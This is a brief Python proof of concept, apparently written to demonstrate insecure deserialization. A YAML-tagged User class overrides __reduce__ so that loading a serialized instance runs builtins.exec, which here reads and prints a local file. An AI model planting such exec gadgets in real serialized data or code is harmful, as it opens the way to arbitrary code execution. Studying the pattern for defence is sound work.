import yaml, builtins

class User(yaml.YAMLObject):
    yaml_loader = yaml.SafeLoader
    yaml_tag = u'!User'

    def __init__(self, name, surname):
       self.name= name
       self.surname= surname

    def __str__(self):
        return "name : {}, surname: {}".format(self.name, self.surname)

    def __reduce__(self):
            return (builtins.exec, ("with open('text.txt','r') as r: print(r.readlines())",))